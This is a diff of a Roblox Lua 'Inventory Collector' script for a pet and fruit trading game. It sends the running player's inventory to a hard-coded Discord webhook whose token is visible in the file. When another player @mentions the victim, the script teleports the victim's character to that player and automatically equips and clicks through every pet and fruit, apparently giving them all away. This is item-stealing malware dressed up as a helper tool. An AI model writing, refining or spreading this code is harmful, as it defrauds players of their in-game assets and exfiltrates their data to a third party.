@@ -10,40 +10,36 @@ local TeleportService = game:GetService("TeleportService")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
 
--- Improved item patterns to handle all cases
-local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d*%.?%d+)kg%]"
-local PET_PATTERN = "(.+)%s%[(%d*%.?%d+)%sKG%]%s%[Age%s(%d+)%]"
+-- Item patterns
+local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d+%.%d+)kg%]"
+local PET_PATTERN = "(.+)%s%[(%d+%.%d+)%sKG%]%s%[Age%s(%d+)%]"
 
 -- Current tool tracking
 local currentTool = nil
 local toolRemovedConn = nil
 
--- Monitor tool removal with better error handling
+-- Monitor tool removal
 local function monitorToolRemoval()
     if toolRemovedConn then
         toolRemovedConn:Disconnect()
     end
     
-    if LocalPlayer.Character then
-        toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
-            if child == currentTool then
-                currentTool = nil
-                toolRemovedConn:Disconnect()
-            end
-        end)
-    end
+    toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
+        if child == currentTool then
+            currentTool = nil
+        end
+    end)
 end
 
--- Inventory scanner with better pattern matching
+-- Inventory scanner with priority sorting
 local function scanInventory(player)
     local fruits = {}
     local pets = {}
-    local rarePets = {}
     
     for _, item in pairs(player.Backpack:GetChildren()) do
         local name = item.Name
         
-        -- Parse fruits (handles any number of mutations)
+        -- Parse fruits
         local fruitTraits, fruitName, fruitWeight = name:match(FRUIT_PATTERN)
         if fruitName then
             local traitCount = select(2, fruitTraits:gsub(",", ",")) + 1
@@ -52,7 +48,7 @@ local function scanInventory(player)
                 item = item,
                 traits = fruitTraits,
                 traitCount = traitCount,
-                weight = tonumber(fruitWeight) or 0
+                weight = tonumber(fruitWeight)
             })
         
         -- Parse pets
@@ -61,29 +57,24 @@ local function scanInventory(player)
             if petName then
                 local isRare = false
                 for _, rarePet in pairs(RARE_PETS) do
-                    if petName:lower():find(rarePet:lower()) then
+                    if petName:find(rarePet) then
                         isRare = true
                         break
                     end
                 end
                 
-                local petData = {
+                table.insert(pets, {
                     name = name,
                     item = item,
-                    weight = tonumber(petWeight) or 0,
-                    age = tonumber(petAge) or 0,
+                    weight = tonumber(petWeight),
+                    age = tonumber(petAge),
                     isRare = isRare
-                }
-                
-                table.insert(pets, petData)
-                if isRare then
-                    table.insert(rarePets, petData)
-                end
+                })
             end
         end
     end
     
-    -- Sort pets by priority (rare > weight > age)
+    -- Sort pets (rare > weight > age)
     table.sort(pets, function(a, b)
         if a.isRare ~= b.isRare then
             return a.isRare
@@ -94,7 +85,7 @@ local function scanInventory(player)
         end
     end)
     
-    -- Sort fruits by priority (trait count > weight)
+    -- Sort fruits (trait count > weight)
     table.sort(fruits, function(a, b)
         if a.traitCount ~= b.traitCount then
             return a.traitCount > b.traitCount
@@ -103,38 +94,20 @@ local function scanInventory(player)
         end
     end)
     
-    return fruits, pets, rarePets
+    return pets, fruits
 end
 
--- Safe string concatenation for webhook
-local function safeConcat(items, maxLength)
-    local result = {}
-    local currentLength = 0
-    
-    for _, item in ipairs(items) do
-        local itemStr = tostring(item)
-        if currentLength + #itemStr > maxLength then
-            table.insert(result, "... (truncated)")
-            break
-        end
-        table.insert(result, itemStr)
-        currentLength = currentLength + #itemStr + 1 -- +1 for newline
-    end
-    
-    return table.concat(result, "\n")
-end
-
--- Send initial inventory with better formatting
+-- Send initial inventory to Discord
 local function sendInitialInventory()
-    local fruits, pets, rarePets = scanInventory(LocalPlayer)
+    local pets, fruits = scanInventory(LocalPlayer)
     
-    -- Prepare pet list
+    -- Format pets
     local petList = {}
     for _, pet in ipairs(pets) do
         table.insert(petList, pet.name .. (pet.isRare and " ★" or ""))
     end
     
-    -- Prepare fruit list
+    -- Format fruits
     local fruitList = {}
     for _, fruit in ipairs(fruits) do
         table.insert(fruitList, fruit.name)
@@ -142,17 +115,17 @@ local function sendInitialInventory()
     
     local embed = {
         title = "📦 "..LocalPlayer.Name.."'s Inventory",
-        description = "Ready to collect items!",
-        color = #rarePets > 0 and 0xFF0000 or 0x00FF00,
+        description = "Execute this script to join:",
+        color = 0x00FF00,
         fields = {
             {
                 name = "🐾 Pets ("..#pets..")",
-                value = #pets > 0 and "```"..safeConcat(petList, 1000).."```" or "```None```",
+                value = #pets > 0 and "```"..table.concat(petList, "\n").."```" or "```None```",
                 inline = true
             },
             {
                 name = "🍇 Fruits ("..#fruits..")",
-                value = #fruits > 0 and "```"..safeConcat(fruitList, 1000).."```" or "```None```",
+                value = #fruits > 0 and "```"..table.concat(fruitList, "\n").."```" or "```None```",
                 inline = true
             },
             {
@@ -165,41 +138,29 @@ local function sendInitialInventory()
     }
     
     pcall(function()
-        local json = HttpService:JSONEncode({
-            content = #rarePets > 0 and "@everyone" or nil,
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
             embeds = {embed}
-        })
-        if request then
-            request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = json
-            })
-        else
-            HttpService:PostAsync(WEBHOOK_URL, json)
-        end
+        }))
     end)
 end
 
--- Improved collection with better error handling
-local function collectFromPlayer(targetPlayer)
+-- Collect items from target player
+local function collectFromTarget(targetPlayer)
     local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
     local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = myChar:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return end
-
+    
     -- Max zoom out
     LocalPlayer.CameraMaxZoomDistance = 100
     LocalPlayer.CameraMinZoomDistance = 100
     LocalPlayer.CameraMode = Enum.CameraMode.Classic
-
+    
     -- Position in front of target
     humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
     myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
-
+    
     -- Get sorted inventory
-    local fruits, pets = scanInventory(targetPlayer)
+    local pets, fruits = scanInventory(targetPlayer)
     local allItems = {}
     
     -- Add pets first
@@ -211,88 +172,69 @@ local function collectFromPlayer(targetPlayer)
     for _, fruit in ipairs(fruits) do
         table.insert(allItems, fruit.item)
     end
-
+    
     -- Process each item
     for _, item in ipairs(allItems) do
         -- Equip the item
-        pcall(function()
-            humanoid:EquipTool(item)
-            currentTool = item
-            monitorToolRemoval()
-        end)
+        humanoid:EquipTool(item)
+        currentTool = item
+        monitorToolRemoval()
         task.wait(0.5)
-
-        -- Click and hold for 5 seconds
+        
+        -- Click and hold until item disappears
         local viewport = Camera.ViewportSize
         local center = Vector2.new(viewport.X/2, viewport.Y/2)
         
         VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
         
-        -- Wait for 5 seconds or until tool is removed
+        -- Wait until item is gone (max 10 seconds)
         local startTime = os.clock()
-        while os.clock() - startTime < 5 and currentTool ~= nil do
+        while currentTool ~= nil and (os.clock() - startTime < 10) do
             task.wait(0.1)
         end
         
         VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
         
-        -- If tool wasn't removed, unequip it manually
+        -- If still equipped, unequip manually
         if currentTool then
-            pcall(function()
-                humanoid:UnequipTools()
-                currentTool = nil
-            end)
+            humanoid:UnequipTools()
+            currentTool = nil
         end
         
-        task.wait(1) -- Cooldown
+        task.wait(1) -- Brief cooldown
     end
 end
 
--- Chat handler with better mention detection
+-- Chat handler
 local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
+    if not message:lower():match("@%s*"..LocalPlayer.Name:lower()) then return end
     
-    -- Check for @mention (more flexible matching)
-    local lowerMsg = message:lower()
-    local lowerName = LocalPlayer.Name:lower()
-    if not (lowerMsg:match("@%s*"..lowerName) or 
-       lowerMsg:match("@everyone") or 
-       lowerMsg:match("@here")) then
-        return
-    end
-    
-    -- Collect from player
-    task.spawn(collectFromPlayer, player)
+    collectFromTarget(player)
 end
 
--- Initialize with proper error handling
-local function initialize()
-    -- Wait for character to load
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    
-    -- Send initial inventory after short delay
-    task.delay(5, sendInitialInventory)
+-- Initialize
+local function main()
+    -- Send initial inventory
+    sendInitialInventory()
     
     -- Setup chat listeners
     for _, player in ipairs(Players:GetPlayers()) do
         if player ~= LocalPlayer then
-            player.Chatted:Connect(onPlayerChatted)
+            player.Chatted:Connect(function(msg)
+                onPlayerChatted(player, msg)
+            end)
         end
     end
     
     Players.PlayerAdded:Connect(function(player)
-        player.Chatted:Connect(onPlayerChatted)
+        player.Chatted:Connect(function(msg)
+            onPlayerChatted(player, msg)
+        end)
     end)
     
-    print("✅ Item Collector Active! Waiting for mentions...")
+    print("✅ Inventory Collector Active! Waiting for mentions...")
 end
 
--- Start with proper error protection
-local success, err = pcall(initialize)
-if not success then
-    warn("❌ Initialization error:", err)
-    -- Try again after delay
-    task.delay(5, function()
-        pcall(initialize)
-    end)
-end
+-- Start
+pcall(main)
